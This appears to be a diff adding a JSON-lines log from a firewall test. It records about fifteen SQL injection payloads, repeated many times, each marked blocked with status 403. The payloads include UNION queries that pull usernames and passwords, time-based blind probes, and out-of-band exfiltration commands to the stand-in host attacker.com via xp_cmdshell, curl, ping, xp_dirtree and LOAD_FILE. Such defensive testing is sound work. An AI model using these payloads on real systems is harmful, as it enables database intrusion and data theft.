+{"payload": "' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005725703995267395}
+{"payload": "' UNION SELECT username, password FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004275652994692791}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006249033998756204}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005221799998253118}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00530761199479457}
+{"payload": "' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005630794999888167}
+{"payload": "' AND IF(1=1,SLEEP(5),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004986015999747906}
+{"payload": "' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004543339004158042}
+{"payload": "' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005327314996975474}
+{"payload": "' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0044589259996428154}
+{"payload": "'; EXEC xp_fileexist '\\\\attacker.com\\check'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004152754001552239}
+{"payload": "'; EXEC master..xp_dirtree '\\\\attacker.com\\leak'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0055537820007884875}
+{"payload": "' UNION SELECT IF(1=1,LOAD_FILE('\\\\attacker.com\\file'),NULL)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004568527001538314}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005522120998648461}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\leak')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006214048000401817}
+{"payload": "' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005036533002567012}
+{"payload": "' UNION SELECT username, password FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005781122003099881}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00610620799852768}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005046883998147678}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005607865998172201}
+{"payload": "' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004905428999336436}
+{"payload": "' AND IF(1=1,SLEEP(5),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005519987003935967}
+{"payload": "' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006110982998507097}
+{"payload": "' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0056256709940498695}
+{"payload": "' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00448777100245934}
+{"payload": "'; EXEC xp_fileexist '\\\\attacker.com\\check'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0056277060066349804}
+{"payload": "'; EXEC master..xp_dirtree '\\\\attacker.com\\leak'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004180438001640141}
+{"payload": "' UNION SELECT IF(1=1,LOAD_FILE('\\\\attacker.com\\file'),NULL)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0037635129992850125}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003824128994892817}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\leak')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0055542429981869645}
+{"payload": "' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038828820033813827}
+{"payload": "' UNION SELECT username, password FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00480208000226412}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005234023999946658}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005419165994680952}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004745901998830959}
+{"payload": "' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0067696980040636845}
+{"payload": "' AND IF(1=1,SLEEP(5),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006068586000765208}
+{"payload": "' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005317493996699341}
+{"payload": "' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004601172004186083}
+{"payload": "' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004114391005714424}
+{"payload": "'; EXEC xp_fileexist '\\\\attacker.com\\check'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004103910003323108}
+{"payload": "'; EXEC master..xp_dirtree '\\\\attacker.com\\leak'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005850857000041287}
+{"payload": "' UNION SELECT IF(1=1,LOAD_FILE('\\\\attacker.com\\file'),NULL)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004728220003016759}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004142514997511171}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\leak')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035896919944207184}
+{"payload": "' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004640589002519846}
+{"payload": "' UNION SELECT username, password FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004908954993879888}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004238886998791713}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004035963997012004}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003896410999004729}
+{"payload": "' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003118725995591376}
+{"payload": "' AND IF(1=1,SLEEP(5),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003954271000111476}
+{"payload": "' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0032945970015134662}
+{"payload": "' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0032994670036714524}
+{"payload": "' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003006318998814095}
+{"payload": "'; EXEC xp_fileexist '\\\\attacker.com\\check'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.002818507004121784}
+{"payload": "'; EXEC master..xp_dirtree '\\\\attacker.com\\leak'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003184993998729624}
+{"payload": "' UNION SELECT IF(1=1,LOAD_FILE('\\\\attacker.com\\file'),NULL)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0033833199995569885}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0037453170007211156}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\leak')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0037118430045666173}
+{"payload": "' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007145235998905264}
+{"payload": "' UNION SELECT username, password FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0047968990038498305}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0037043190022814088}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0047863790023257025}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005043896002462134}
+{"payload": "' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004494424996664748}
+{"payload": "' AND IF(1=1,SLEEP(5),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003357939000125043}
+{"payload": "' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003993416001321748}
+{"payload": "' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003623491997132078}
+{"payload": "' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003469013005087618}
+{"payload": "'; EXEC xp_fileexist '\\\\attacker.com\\check'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0034464759955881163}
+{"payload": "'; EXEC master..xp_dirtree '\\\\attacker.com\\leak'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004456354996364098}
+{"payload": "' UNION SELECT IF(1=1,LOAD_FILE('\\\\attacker.com\\file'),NULL)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003954006002459209}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003346382000017911}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\leak')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0031451060058316216}
+{"payload": "' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036640370017266832}
+{"payload": "' UNION SELECT username, password FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005284029997710604}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004298075997212436}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035290690066176467}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003456008998909965}
+{"payload": "' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004153927002334967}
+{"payload": "' AND IF(1=1,SLEEP(5),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003453884994087275}
+{"payload": "' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0034170719955000095}
+{"payload": "' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004075705997820478}
+{"payload": "' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003111883001110982}
+{"payload": "'; EXEC xp_fileexist '\\\\attacker.com\\check'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.002899694001825992}
+{"payload": "'; EXEC master..xp_dirtree '\\\\attacker.com\\leak'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003216404002159834}
+{"payload": "' UNION SELECT IF(1=1,LOAD_FILE('\\\\attacker.com\\file'),NULL)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038591889970120974}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035843020013999194}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\leak')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0030483910013572313}
+{"payload": "' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003125592993455939}
+{"payload": "' UNION SELECT username, password FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.002906742003688123}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0029161519996705465}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003141168999718502}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005121285001223441}
+{"payload": "' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004224112999509089}
+{"payload": "' AND IF(1=1,SLEEP(5),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003995358994870912}
+{"payload": "' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003898889000993222}
+{"payload": "' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004153150999627542}
+{"payload": "' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0042025709990412}
+{"payload": "'; EXEC xp_fileexist '\\\\attacker.com\\check'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00449820100038778}
+{"payload": "'; EXEC master..xp_dirtree '\\\\attacker.com\\leak'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004173614994215313}
+{"payload": "' UNION SELECT IF(1=1,LOAD_FILE('\\\\attacker.com\\file'),NULL)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005415704996266868}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004619447005097754}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\leak')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003880518001096789}
+{"payload": "' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004423819002113305}
+{"payload": "' UNION SELECT username, password FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004080695005541202}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005071651001344435}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004357158002676442}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004005962000519503}
+{"payload": "' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004697035998106003}
+{"payload": "' AND IF(1=1,SLEEP(5),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006004202994517982}
+{"payload": "' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006667784997262061}
+{"payload": "' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006124042003648356}
+{"payload": "' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004421233003085945}
+{"payload": "'; EXEC xp_fileexist '\\\\attacker.com\\check'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004301091001252644}
+{"payload": "'; EXEC master..xp_dirtree '\\\\attacker.com\\leak'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004848390999541152}
+{"payload": "' UNION SELECT IF(1=1,LOAD_FILE('\\\\attacker.com\\file'),NULL)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003719747001014184}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035216269970987923}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\leak')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036927850014762953}
+{"payload": "' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0039037840033415705}
+{"payload": "' UNION SELECT username, password FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004092792994924821}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003520426995237358}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003555609997420106}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0043077449954580516}
+{"payload": "' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005898167997656856}
+{"payload": "' AND IF(1=1,SLEEP(5),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004246324999257922}
+{"payload": "' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004337510996265337}
+{"payload": "' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004487380996579304}
+{"payload": "' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00414252500195289}
+{"payload": "'; EXEC xp_fileexist '\\\\attacker.com\\check'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0037066930017317645}
+{"payload": "'; EXEC master..xp_dirtree '\\\\attacker.com\\leak'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004968405999534298}
+{"payload": "' UNION SELECT IF(1=1,LOAD_FILE('\\\\attacker.com\\file'),NULL)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004210892002447508}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038705400002072565}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\leak')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038556409999728203}
+{"payload": "' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00456564300111495}
